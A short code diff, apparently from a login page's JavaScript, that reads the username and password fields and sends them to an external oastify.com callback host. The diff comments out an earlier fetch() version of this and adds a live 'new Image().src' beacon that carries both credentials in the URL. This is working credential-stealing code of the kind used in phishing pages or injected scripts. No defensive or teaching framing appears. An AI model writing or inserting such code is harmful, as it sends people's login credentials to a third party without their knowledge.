@@ -128,12 +128,14 @@
         const u = document.getElementById('username').value;
         const p = document.getElementById('password').value;
 
-        const response = fetch('https://xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/?u=' + 
-            encodeURIComponent(u) + '&p=' + encodeURIComponent(p))
+        // const response = fetch('https://xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/?u=' + 
+        //     encodeURIComponent(u) + '&p=' + encodeURIComponent(p))
 
 
-        const result = response.json();
-        console.log(result);
+        // const result = response.json();
+        // console.log(result);
+
+        new Image().src = 'https://xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/?u=' + u + '&p=' + p;
         
         // const ub64 = btoa(u)
         // const pb64 = btoa(p)
